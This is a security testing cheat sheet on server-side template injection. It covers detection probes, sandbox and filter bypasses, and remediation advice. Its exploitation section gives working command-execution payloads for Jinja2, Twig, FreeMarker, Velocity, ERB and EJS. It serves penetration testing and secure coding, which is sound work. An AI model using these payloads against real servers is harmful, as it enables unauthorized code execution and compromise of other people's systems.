# Server-Side Template Injection (SSTI)

> User input concatenated into a template string evaluated server-side → RCE. Authorized testing only. Map: WSTG-INPV-18, CWE-94/1336.

## TL;DR
- Identify the engine first (Jinja2/Twig/FreeMarker/Velocity/ERB/Smarty/Pebble/Handlebars/Mustache/Razor), then pick the engine-specific RCE gadget.
- Quick probe: `{{7*7}}` returns `49` → template engine; `${7*7}` returns `49` → JSP/Spring EL; `<%= 7*7 %>` → ERB/EJS; `#{7*7}` → Pebble/Ruby.
- Most engines have a "shell escape" gadget (subprocess, runtime exec, eval).
- Defence: never concatenate user input into a template string; use the engine's variable-substitution API with autoescape.

## Detection / Discovery
| Probe | If `49` returns | Likely engine |
| --- | --- | --- |
| `{{7*7}}` | yes | Jinja2 / Twig / Nunjucks |
| `${7*7}` | yes | FreeMarker / Spring EL / JSP |
| `<%= 7*7 %>` | yes | ERB / EJS |
| `#{7*7}` | yes | Pebble / Ruby slim |
| `*{7*7}` | yes | Thymeleaf |
| `{7*7}` | yes | Smarty / Mustache |

Differential probes: `{{7*'7'}}` returns `49` in Twig, `7777777` in Jinja2 → distinguishes.

```bash
curl "https://target/?name={{7*7}}"
curl "https://target/?name=\${7*7}"
```

## Exploitation

### Jinja2 (Python) — class-walk to `os`
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}            # list all subclasses
# Find one with __init__ that exposes os.popen, e.g. <class 'subprocess.Popen'>
{{ ''.__class__.__mro__[1].__subclasses__().__getitem__(IDX_OF_POPEN)('id', shell=True, stdout=-1).communicate()[0] }}

# Shorter via config (Flask):
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Twig (PHP)
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
{{ ['id', null]|sort('passthru') }}
```

### FreeMarker (Java)
```ftl
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

### Velocity (Java)
```velocity
#set($e="x")
#set($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
$a.getInputStream()
```

### ERB (Ruby)
```erb
<%= `id` %>
<%= system("id") %>
```

### EJS / Handlebars / Mustache (JS)
Engine-dependent. EJS: `<%= process.mainModule.require('child_process').execSync('id').toString() %>`.

## Bypasses
- Sandbox bypass (Jinja2 SandboxedEnvironment): use `lipsum.__globals__['os'].popen` if `__class__`/`__mro__` is blocked.
- Filter on `{{`/`}}` → look for `{% %}` / `{# #}` / engine alternatives (`{%set%}`).
- Word-blocklist (`os`, `system`, `exec`) → string concatenation (`'o'+'s'`), unicode escapes, attribute access via getattr.

## Defence / Remediation
- **Never concatenate user input into a template string**. Always pass user data as *variables* through the engine's substitution API (autoescaped).
- **Sandbox**: Jinja2 `SandboxedEnvironment`, Twig `SandboxExtension`. Treat as raise-the-bar, not silver bullet; gadget escapes exist.
- **Autoescape on** in all engines for new code; explicit `|safe` / `|raw` only where reviewed.
- **Don't expose template rendering to user-supplied template strings** (the `?template=...` antipattern).
- CWE-94 Code Injection, CWE-1336 Template Injection.

## Sources
- OWASP WSTG-INPV-18 Server-Side Template Injection: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- James Kettle — SSTI (Black Hat 2015): https://portswigger.net/research/server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- tplmap: https://github.com/epinna/tplmap
